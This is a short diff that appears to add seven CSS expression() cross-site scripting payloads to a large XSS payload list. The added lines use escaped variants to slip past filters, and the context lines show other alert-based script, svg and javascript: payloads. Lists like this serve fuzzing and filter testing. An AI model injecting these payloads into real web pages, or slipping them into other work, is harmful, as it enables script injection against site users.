@@ -6604,3 +6604,10 @@ feed:data:text/html,&#x3c;script>alert('Top Page Location: '+document.location+'
 <svg onload=(alert)(1)>
 <script>$=1,alert($)</script>
 <form><button formaction="javascript:alert(1)">
+<div style=xss:expression(alert(1))>
+<div style=xss:expression(1)-alert(1)>
+<div style=xss:expressio\6e(alert(1))>
+<div style=xss:expressio\006e(alert(1))>
+<div style=xss:expressio\00006e(alert(1))>
+<div style=xss:expressio\6e(alert(1))>
+<div style=xss:expressio&#x5c;6e(alert(1))>
